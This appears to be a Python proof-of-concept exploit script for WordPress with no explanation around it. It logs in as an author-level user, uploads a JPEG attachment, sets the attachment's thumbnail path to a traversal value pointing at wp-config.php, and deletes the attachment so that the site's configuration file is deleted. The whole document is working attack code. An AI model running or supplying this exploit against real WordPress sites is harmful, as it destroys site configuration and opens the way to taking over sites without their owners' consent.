from requests_html import HTMLSession
import json

session = HTMLSession()

url = 'http://127.0.0.1/'
username = 'evil'
password = 'evil'

r = session.post(url+'/wp-login.php', data={'log':username, 'pwd':password})
if session.get(url+'/wp-admin/upload.php').status_code != 200 and session.get(url+'/wp-admin/post.php?post=1&action=edit') != 200:
    print('Sorry, the poc may not working in this website')
    exit(0)

r = session.get(url+'/wp-admin/post.php?post=1&action=edit')
wpnonce_file_value = r.html.search('_wpnonce":"{}"')[0]
file_data = """
------WebKitFormBoundaryWwMb0WIhgbcItOfB
Content-Disposition: form-data; name="name"

2.jpg
------WebKitFormBoundaryWwMb0WIhgbcItOfB
Content-Disposition: form-data; name="action"

upload-attachment
------WebKitFormBoundaryWwMb0WIhgbcItOfB
Content-Disposition: form-data; name="_wpnonce"

{}
------WebKitFormBoundaryWwMb0WIhgbcItOfB
Content-Disposition: form-data; name="async-upload"; filename="2.jpg"
Content-Type: image/jpg

\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.\' \",#\x1c\x1c(7),01444\x1f\'9=82<.342\xff\xdb\x00C\x01\t\t\t\x0c\x0b\x0c\x18\r\r\x182!\x1c!22222222222222222222222222222222222222222222222222\xff\xc2\x00\x11\x08\x003\x002\x03\x01\"\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x17\x00\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x06\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03\x01\x00\x02\x10\x03\x10\x00\x00\x01\xed\x96\x16),\xa0\x04\x0b\x00\x11@\x11aJE\x002\x16\x80\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02G\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xff\xda\x00\x08\x01\x03\x01\x01?\x01\x07\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xff\xda\x00\x08\x01\x02\x01\x01?\x01\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\xff\xda\x00\x08\x01\x01\x00\x06?\x02G\xff\xc4\x00\x1b\x10\x00\x01\x05\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x01\x111A !\xff\xda\x00\x08\x01\x01\x00\x01?!\x12\xad7l<-\xe8cC\x06\xf1#\x0c*M\n\xd6u\x83O\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10!\x8f0\xb2\x880SG<\x81\xcf<\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xff\xda\x00\x08\x01\x03\x01\x01?\x10\x07\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xff\xda\x00\x08\x01\x02\x01\x01?\x10\x07\xff\xc4\x00 \x10\x01\x00\x02\x02\x02\x02\x03\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x11!1\x10AQa q\x91\xb1\xff\xda\x00\x08\x01\x01\x00\x01?\x10p\xdfS$\xa4-7\xa9\x93\xf5\xcaY\x115\x99\xac\xa4-3;q~G\xef\x18\x82\xd7,\x9b1\xdc\xa3\xc4?\x11\xb7\xea\r*\x88Q\xe4fhz\x94\xd7\x065(\x18\x95\x9bw\x0c\xdb\xb8\xb9\x12[U\\\x11\xd3QF\xde\xa1\xfd\xce\xc3\xe0\x05\xb8\x8e\xd3\xa2\x1c\xbf\xff\xd9
------WebKitFormBoundaryWwMb0WIhgbcItOfB--
"""
# upload a image
r = session.post(url+'/wp-admin/async-upload.php', headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryWwMb0WIhgbcItOfB'},data=file_data.format(wpnonce_file_value))
img_json = json.loads(r.text)
img_id = str(img_json['data']['id'])
edit_link = img_json['data']['editLink']

r = session.get(edit_link)
wpnonce_post_value = r.html.find('#_wpnonce',first=True).attrs['value']
# update the filepath to wp-config.php
r = session.post(url+'/wp-admin/post.php?post='+img_id, data={'action':'editattachment', '_wpnonce':wpnonce_post_value, 'thumb':'../../../../wp-config.php'})
if r.status_code != 200:
    print('Oops, something wrong')
    exit(0)

wpnonce_delete_value = r.html.find('#delete-action',first=True).search('_wpnonce={}"')[0]
# delete the wp-config.php
if session.post(url+'/wp-admin/post.php?post='+img_id, data={'action':'delete', '_wpnonce':wpnonce_delete_value}).status_code != 200:
    print('Oops, something wrong')
    exit(0)

print('Done!', url)
